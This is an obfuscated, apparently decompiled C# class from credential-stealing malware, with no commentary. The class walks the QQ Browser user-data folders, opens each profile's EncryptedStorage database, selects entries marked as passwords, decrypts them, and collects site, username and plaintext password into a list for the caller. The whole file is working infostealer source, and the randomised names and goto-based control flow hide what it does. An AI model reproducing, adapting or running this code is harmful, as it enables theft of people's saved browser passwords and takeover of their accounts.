using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using _81d;
using TMiOl;
using p3N5Y;

namespace ZAZUx;

public class ylArCfMFriB : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string K62I
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public ylArCfMFriB()
	{
		K62I = "QQ Browser";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] directories = default;
		string text = default;
		int num2 = default;
		List<ii68> list = default;
		int num3 = default;
		List<string> list2 = default;
		string text2 = default;
		string[] array = default;
		string text3 = default;
		while (true)
		{
			if (num == 5)
			{
				directories = Directory.GetDirectories(text);
				num = 6;
			}
			if (num == 15)
			{
				num2 = 0;
				num = 16;
			}
			if (num == 8)
			{
				goto IL_0069;
			}
			goto IL_007f;
			IL_0090:
			list = new List<ii68>();
			num = 14;
			goto IL_00a2;
			IL_012f:
			if (num3 < directories.Length)
			{
				goto IL_0069;
			}
			num = 13;
			goto IL_0147;
			IL_0147:
			if (num == 2)
			{
				list2 = new List<string>();
				num = 3;
			}
			if (num == 3)
			{
				list2.Add(text + "\\Default\\EncryptedStorage");
				num = 4;
			}
			if (num == 16)
			{
				goto IL_04bc;
			}
			if (num == 1)
			{
				text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tencent\\QQBrowser\\User Data");
				num = 2;
			}
			if (num == 6)
			{
				num3 = 0;
				num = 7;
			}
			if (num == 18)
			{
				if (!File.Exists(text2))
				{
					goto IL_04ae;
				}
				num = 19;
			}
			if (num == 11)
			{
				goto IL_0248;
			}
			goto IL_025f;
			IL_04bc:
			if (num2 >= array.Length)
			{
				break;
			}
			goto IL_02c0;
			IL_007f:
			if (num == 13)
			{
				goto IL_0090;
			}
			goto IL_00a2;
			IL_00a2:
			if (num == 14)
			{
				array = list2.ToArray();
				num = 15;
			}
			if (num == 9)
			{
				if (!text3.Contains("Profile"))
				{
					goto IL_0248;
				}
				num = 10;
			}
			if (num == 4)
			{
				if (!Directory.Exists(text))
				{
					goto IL_0090;
				}
				num = 5;
			}
			if (num == 12)
			{
				goto IL_012f;
			}
			goto IL_0147;
			IL_02d6:
			if (num == 0)
			{
				num = 1;
			}
			if (num != 19)
			{
				continue;
			}
			_5bBC obj;
			try
			{
				obj = new _5bBC(text2);
			}
			catch
			{
				goto IL_04ae;
			}
			if (obj.ga9("entries"))
			{
				byte[] array2 = TMiOl._0OgNv.KC1Z(Directory.GetParent(text2).Parent.FullName);
				for (int i = 0; i <= obj.FtN5geM() - 1; i++)
				{
					if (!(obj.Jw0(i, "category") == "Password"))
					{
						continue;
					}
					try
					{
						string text4 = obj.Jw0(i, "str3");
						string text5 = obj.Jw0(i, "str2");
						string text6 = TMiOl._0OgNv.NLU3vLrG(obj.Jw0(i, "blob0"));
						if (string.IsNullOrEmpty(text6) && array2 != null)
						{
							text6 = TMiOl._0OgNv.NzCWzvruJM(Encoding.Default.GetBytes(obj.Jw0(i, "password_value")), array2);
						}
						if (!string.IsNullOrEmpty(text4) && !string.IsNullOrEmpty(text5) && text6 != null)
						{
							list.Add(new ii68
							{
								byIdLuuGZbL = text4,
								S8v = text5,
								_9H5rP7hg2 = text6,
								oVAe = K62I
							});
						}
					}
					catch
					{
					}
				}
			}
			goto IL_04ae;
			IL_0069:
			text3 = directories[num3];
			num = 9;
			goto IL_007f;
			IL_04ae:
			num2++;
			goto IL_04bc;
			IL_0248:
			num3++;
			num = 12;
			goto IL_025f;
			IL_02c0:
			text2 = array[num2];
			num = 18;
			goto IL_02d6;
			IL_025f:
			if (num == 10)
			{
				list2.Add(text3 + "\\EncryptedStorage");
				num = 11;
			}
			if (num == 7)
			{
				goto IL_012f;
			}
			if (num == 17)
			{
				goto IL_02c0;
			}
			goto IL_02d6;
		}
		return list;
	}
}
